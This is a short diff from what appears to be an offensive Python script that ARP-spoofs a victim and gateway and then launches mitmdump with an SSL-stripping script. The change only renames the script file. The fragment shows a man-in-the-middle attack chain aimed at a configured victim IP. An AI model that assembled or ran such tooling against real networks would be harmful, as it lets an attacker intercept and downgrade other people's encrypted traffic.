@@ -36,7 +36,7 @@ def start_arp_spoofing(target_ip, gateway_ip):
         sys.exit(0)
 
 def start_mitmproxy():
-    os.system("mitmdump -s sslstrip.py")
+    os.system("mitmdump -s sslstripmitm.py")
 
 target_ip = c.VICTIM_IP
 gateway_ip = c.GATEWAY_IP
